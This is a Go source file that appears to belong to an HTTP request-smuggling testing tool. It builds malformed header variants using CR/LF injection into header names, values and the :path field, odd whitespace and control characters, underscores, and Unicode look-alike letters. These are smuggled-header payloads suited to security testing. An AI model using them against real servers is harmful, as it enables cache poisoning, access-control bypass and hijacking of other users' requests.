package main

import (
	"fmt"
	"net/url"
	"strings"
)

type SmugglingMethod int

const (
	HeaderSmugglingNone SmugglingMethod = iota
	HeaderSmugglingUnderscore
	HeaderSmugglingSpacedHeader
	HeaderSmugglingNewlineValue
	HeaderSmugglingNewlineName
	HeaderSmugglingNewlinePath
	HeaderSmugglingUnicodeCharacters
)

var SmugglingMethods = []SmugglingMethod{
	HeaderSmugglingNewlineValue,
	HeaderSmugglingNewlineName,
	HeaderSmugglingNewlinePath,
	HeaderSmugglingSpacedHeader,
	HeaderSmugglingUnderscore,
	HeaderSmugglingUnicodeCharacters,
	HeaderSmugglingNone,
}

type SmugglingVariant fmt.Stringer

func (s SmugglingMethod) Smuggle(h *Header, url *url.URL, variant SmugglingVariant) {
	switch s {
	case HeaderSmugglingNone:
		// no action
	case HeaderSmugglingUnderscore:
		h.Name = strings.Replace(h.Name, "-", "_", -1)

	case HeaderSmugglingSpacedHeader:
		space := variant.(spacedHeaderParams)
		h.Name += string(space)

	case HeaderSmugglingNewlineValue:
		v := variant.(*newlineHeaderParams)
		h.Value = fmt.Sprintf("val%s%s:%s", v.Newline, h.Name, h.Value)
		h.Name = v.Header

	case HeaderSmugglingNewlineName:
		v := variant.(*newlineHeaderParams)
		h.Name = fmt.Sprintf("%s%s%s", v.Header, v.Newline, h.Name)

	case HeaderSmugglingNewlinePath:
		v := variant.(*newlinePathParams)
		h.Value = fmt.Sprintf("%s HTTP/1.1%s%s: %s%sfake-header: ", url.Path, v, h.Name, h.Value, v)
		h.Name = ":path"

	case HeaderSmugglingUnicodeCharacters:
		v := variant.(unicodeSmugglingParams)
		switch v {
		case ReplaceSLetterInName:
			name := strings.Replace(h.Name, "s", "\u017f", 1)
			if name == h.Name {
				panic(fmt.Errorf("replacing letter S requested, but no S letter in name: %v", h.Name))
			}
			h.Name = name

		case ReplaceKLetterInValue:
			value := strings.Replace(h.Value, "k", "\u212a", 1)
			if value == h.Value {
				panic(fmt.Errorf("replacing letter K requested, but no K letter in value: %v", h.Value))
			}
			h.Value = value

		default:
			panic(fmt.Errorf("invalid header smuggling variant for UTF8 replace: %v", v))
		}

	default:
		panic(fmt.Errorf("invalid header smuggling: %#v", s))
	}
}

func (s SmugglingMethod) GetVariants() (variants []SmugglingVariant) {
	newlines := []string{"\r\n", "\r", "\n"}
	switch s {
	case HeaderSmugglingNone, HeaderSmugglingUnderscore:
		return []SmugglingVariant{noParams{}}

	case HeaderSmugglingSpacedHeader:
		for _, space := range []string{"\x00", " ", "\t", "\v", "\u0085", "\u00A0", "\U000130BA"} {
			variants = append(variants, spacedHeaderParams(space))
		}
		return

	case HeaderSmugglingNewlineName:
		for _, nl := range newlines {
			for _, h := range []string{"x", "x:"} {
				variants = append(variants, &newlineHeaderParams{nl, h})
			}
		}
		return

	case HeaderSmugglingNewlineValue:
		for _, nl := range newlines {
			for _, h := range []string{"header", " header", "x-forwarded-for"} {
				variants = append(variants, &newlineHeaderParams{nl, h})
			}
		}
		return

	case HeaderSmugglingNewlinePath:
		for _, nl := range newlines {
			variants = append(variants, newlinePathParams(nl))
		}
		return

	case HeaderSmugglingUnicodeCharacters:
		return []SmugglingVariant{ReplaceKLetterInValue, ReplaceSLetterInName}

	default:
		panic(fmt.Errorf("invalid header smuggling: %#v", s))
	}
}

func (s SmugglingMethod) String() string {
	switch s {
	case HeaderSmugglingNone:
		return "no header smuggling"
	case HeaderSmugglingUnderscore:
		return "header smuggling via underscore"
	case HeaderSmugglingSpacedHeader:
		return "header smuggling via adding space"
	case HeaderSmugglingNewlineValue:
		return "header smuggling via newline in header value"
	case HeaderSmugglingNewlineName:
		return "header smuggling via newline in header name"
	case HeaderSmugglingNewlinePath:
		return "header smuggling via newline in header path"
	case HeaderSmugglingUnicodeCharacters:
		return "header smuggling via unicode lowercase/uppercase"
	default:
		return "unknown header smuggling method"
	}
}

type noParams struct{}

func (noParams) String() string {
	return "N/A"
}

type spacedHeaderParams string

func (p spacedHeaderParams) String() string {
	return fmt.Sprintf("space=%#v", string(p))
}

type newlineHeaderParams struct {
	Newline, Header string
}

func (p *newlineHeaderParams) String() string {
	return fmt.Sprintf("newline=%#v fake_header=%s", p.Newline, p.Header)
}

type newlinePathParams string

func (p newlinePathParams) String() string {
	return fmt.Sprintf("newline=%#v", p)
}

type unicodeSmugglingParams int

const (
	ReplaceKLetterInValue unicodeSmugglingParams = iota
	ReplaceSLetterInName
)

func (p unicodeSmugglingParams) String() string {
	switch p {
	case ReplaceKLetterInValue:
		return "replace k by K (\\u212a) in header value"
	case ReplaceSLetterInName:
		return "replace s by ſ (\\u017f) in header name"
	default:
		panic(fmt.Errorf("unknown utf8SmugglingParam: %v", p))
	}
}
